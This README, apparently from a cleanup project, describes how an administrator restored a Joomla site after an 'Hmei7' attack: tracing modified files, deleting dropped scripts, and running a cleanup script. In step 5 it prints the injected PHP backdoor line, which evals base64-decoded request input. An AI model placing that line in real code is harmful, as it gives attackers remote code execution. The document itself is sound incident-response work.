Hmei7-cleanup
=============

Background:
===========
I had to clean up after an HMEI7 script attack on a Joomla site this morning and 
figured I should share my efforts. The site owner did not have a recent backup, so
the decision was made to clean up the existing site.

The HMEI7 script is rather crude in its approach. It modified the index.php page 
and and replaced it with Base64 encoded version that containing another Base64 
encoded redirect to some external site. A good number of .PHP scripts were modified 
with additional lines of code that would prevent the site from working even after the 
index page was restored. I wrote a small script that tracked down the modified pages
and removed the unwanted code.

Clean up:
=========

0.	Backed up the existing files.

		tar cjf cms.tar.bz2 cms/

1. 	Identify the time of the attack. The script drops its signature into x.txt in the root 
	folder. The file contains "hacked by Hmei7". Noted the modification time of the file
   
2. 	Find all files that were modified since that time. In my case 2 days
 
 		find . -mtime -2 >modified_files.txt
	
	Copied that file per FTP to my laptop for later reference

3.	The attack script added number of new files. Removed all

		find . -name "index.old.php" -exec rm -f {} \;
		find . -name "index.1.php" -exec rm -f {} \;
		find . -name "class.back.php" -exec rm -f {} \;

4.  Cleared out the tmp folders

5.	Analyzed the modified file and found a pattern. The modified PHP files contained the 
	following additional code. It would be either on be on 1 line or on 3.
	
		<?PHP defined('_OLD_JEXEC_') or die(@eval(base64_decode($_REQUEST['comment']))); ?>

		<?PHP
		 defined('_OLD_JEXEC_') or die(@eval(base64_decode($_REQUEST['comment'])));
		?><?php...
		
	I wrote and ran the cleanup.py script to deal with those. The script creates back up
	copies of every file modified by adding the extension .bad to the file name. Once the 
	site is restored these can be deleted with
	
		find . -name "*.bad" -exec rm -f {} \;
	
6.	Checked the .htaccess files

7.	Checked the configuration.php file

8.	Removed the x.txt file under root

9.	Copied the index.php back from backup and et voila the site was up again

10. Ran a quick grep tests to make sure I did not miss any files.


